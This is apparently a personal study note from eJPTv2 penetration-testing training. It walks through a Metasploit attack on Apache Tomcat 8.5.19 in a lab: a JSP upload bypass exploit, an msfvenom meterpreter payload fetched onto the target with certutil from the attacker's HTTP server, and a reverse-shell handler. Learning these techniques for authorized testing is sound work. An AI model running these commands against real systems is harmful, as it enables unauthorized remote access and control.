---
up: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/The Metasploit Framework/Windows Exploitation/Windows Exploitation]]"
---

# Exploiting Apache Tomcat Server

- Tomcat server is a popular free and open source Java servlet web server
- It is used to build and host dynamic websites and web apps based on Java
- Apache Tomcat uses HTTP and runs on port 8080 by default

- Standard Apache HTTP web server is used to host static or dynamic web apps typically developed in PHP
- Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java
- Apache Tomcat v8.5.19 is vulnerable to a remote code execution vulnerability
- MSF has a prebuilt module for this vuln

## Demonstration

```bash
> db_nmap -sS -sV -O <ip>
# see services
> services
# exploit upload vuln
> use exploit/multi/http/tomcat_jsp_upload_bypass
> infos
> set payload java/jsp_shell_bind_tcp
> set shell cmd
> run
# obtain meterpreter session
>ctrl+z
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=1234 -f exe > payload.exe
$ sudo python -m http.server 80
# on msf
> sessions 1
>certutil -urlcache -f http://<my_ip>/payload.exe payload.exe
>dir
# set handler
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST <my_ip>
> set LPORT 1234
> run
# execute payload
>.\payload.exe
```
